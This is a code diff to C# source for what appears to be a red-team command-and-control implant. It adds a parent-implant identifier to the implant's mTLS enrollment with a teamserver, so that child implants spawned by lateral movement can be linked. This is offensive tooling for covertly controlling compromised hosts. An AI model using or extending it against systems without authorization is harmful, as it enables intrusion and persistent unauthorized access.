@@ -27,7 +27,9 @@ internal enum EnrollStatus
 
 // The JSON body of POST /implants/enroll. PublicKey is the implant's own
 // SubjectPublicKeyInfo, base64 over JSON; the teamserver signs a leaf over it so
-// the implant keeps its private key (architecture.md Sec 9).
+// the implant keeps its private key (architecture.md Sec 9). ParentImplantId,
+// when set, names the implant this one derives from (architecture.md Sec 10.1):
+// a child enroll carried over from lateral.move.
 internal sealed class EnrollRequest
 {
     [JsonPropertyName("stagerTokenSecret")]
@@ -40,6 +42,10 @@ internal sealed class EnrollRequest
     [JsonPropertyName("publicKey")]
     [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
     public string? PublicKey { get; set; }
+
+    [JsonPropertyName("parentImplantId")]
+    [JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
+    public string? ParentImplantId { get; set; }
 }
 
 // Mirrors the teamserver's EnrollmentResponse: the issued leaf and CA chain,
@@ -61,12 +67,16 @@ internal sealed class EnrollResponse
 
     [JsonPropertyName("caChain")]
     public string[]? CaChain { get; set; }
+
+    [JsonPropertyName("parentImplantId")]
+    public string? ParentImplantId { get; set; }
 }
 
 /// <summary>
 /// The result of a successful enroll: the implant's identity, its engagement,
 /// the leaf certificate paired with its private key (so it can be presented in
-/// mTLS), and the CA chain to trust as the server identity.
+/// mTLS), and the CA chain to trust as the server identity. ParentImplantId is
+/// set only for a child enroll that named a parent.
 /// </summary>
 internal sealed class Enrollment
 {
@@ -87,6 +97,12 @@ internal sealed class Enrollment
     /// validate the leaf's chain at enroll.
     /// </summary>
     public IReadOnlyList<X509Certificate2> CAs { get; init; } = Array.Empty<X509Certificate2>();
+
+    /// <summary>
+    /// The parent this implant derived from, empty for a top-level (stager-
+    /// derived) enroll.
+    /// </summary>
+    public string ParentImplantId { get; init; } = string.Empty;
 }
 
 /// <summary>
@@ -105,7 +121,7 @@ internal static class C2
         RSA privateKey,
         X509Certificate2Collection? serverCAs,
         CancellationToken cancellationToken = default)
-        => await EnrollAsync(enrollUrl, stagerToken, privateKey, serverCAs, new TransportProfile(), cancellationToken);
+        => await EnrollAsync(enrollUrl, stagerToken, parentImplantId: null, privateKey, serverCAs, new TransportProfile(), cancellationToken);
 
     /// <summary>
     /// Enrolls and applies the malleable transport profile to the enroll request
@@ -116,9 +132,15 @@ internal static class C2
     /// lands on the URL itself. A null/empty profile leaves the request identical
     /// to the un-profiled shape.
     /// </summary>
+    /// <param name="parentImplantId">
+    /// The implant this one derives from on a child enroll (architecture.md Sec
+    /// 10.1, lateral.move); null is a top-level enroll. The teamserver resolves
+    /// and scope-checks the parent before recording the linkage.
+    /// </param>
     public static async Task<Enrollment> EnrollAsync(
         string enrollUrl,
         string stagerToken,
+        string? parentImplantId,
         RSA privateKey,
         X509Certificate2Collection? serverCAs,
         TransportProfile profile,
@@ -131,6 +153,7 @@ internal static class C2
         {
             StagerTokenSecret = stagerToken,
             PublicKey = Convert.ToBase64String(pubSpki),
+            ParentImplantId = parentImplantId,
         };
 
         using var handler = new HttpClientHandler();
@@ -201,6 +224,7 @@ internal static class C2
             Leaf = paired,
             PrivateKey = privateKey,
             CAs = cas,
+            ParentImplantId = er.ParentImplantId ?? string.Empty,
         };
     }
 
